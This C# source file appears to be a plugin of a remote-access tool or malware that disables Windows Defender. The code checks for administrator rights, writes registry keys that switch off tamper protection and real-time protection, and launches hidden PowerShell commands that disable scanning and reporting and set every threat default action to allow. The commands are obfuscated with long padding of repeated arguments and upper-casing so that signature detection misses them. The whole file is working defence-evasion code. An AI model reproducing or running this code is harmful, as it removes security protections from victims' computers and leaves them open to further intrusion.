using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Plugin.Handler
{
    class HandleDisableDefender
    {
        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    //Arguments = "Get-MpPreference -verbose",
                    Arguments = "-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL GET-MPPREFERENCE -VERBOSE",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
                    RunPS("SET-MPPREFERENCE -DISABLEREALTIMEMONITORING $TRUE"); //REAL-TIME PROTECTION

                else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEBEHAVIORMONITORING $TRUE"); //BEHAVIOR MONITORING

                else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEBLOCKATFIRSTSEEN $TRUE");

                else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEIOAVPROTECTION $TRUE"); //SCANS ALL DOWNLOADED FILES AND ATTACHMENTS

                else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEPRIVACYMODE $TRUE"); //DISPLAYING THREAT HISTORY

                //else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
                else if (line.Contains(@"SIGNATUREDISABLEUPDATEONSTARTUPWITHOUTENGINE") && line.Contains("False"))
                    //RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -SIGNATUREDISABLEUPDATEONSTARTUPWITHOUTENGINE $TRUE"); //DEFINITION UPDATES ON STARTUP
                //else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
                else if (line.Contains(@"DISABLEARCHIVESCANNING") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEARCHIVESCANNING $TRUE"); //SCAN ARCHIVE FILES, SUCH AS .ZIP AND .CAB FILES
                //else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
                else if (line.Contains(@"DISABLEINTRUSIONPREVENTIONSYSTEM") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLEINTRUSIONPREVENTIONSYSTEM $TRUE"); // NETWORK PROTECTION 
                //else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
                else if (line.Contains(@"DISABLESCRIPTSCANNING") && line.Contains("False"))
                    //RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -DISABLESCRIPTSCANNING $TRUE"); //SCANNING OF SCRIPTS DURING SCANS

                else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
                    //RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -SUBMITSAMPLESCONSENT 2"); //MAPSREPORTING 

                else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
                    //RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -MAPSREPORTING 0"); //MAPSREPORTING 

                else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
                    //RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -HIGHTHREATDEFAULTACTION 6 -FORCE"); // HIGH LEVEL THREAT // ALLOW

                else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
                    //RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -MODERATETHREATDEFAULTACTION 6"); // MODERATE LEVEL THREAT

                else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
                    //RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -LOWTHREATDEFAULTACTION 6"); // LOW LEVEL THREAT

                else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                    //RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
                    RunPS("-W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL -W NORMAL SET-MPPREFERENCE -SEVERETHREATDEFAULTACTION 6"); // SEVERE LEVEL THREAT
            }
        }

        private void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

    }
}
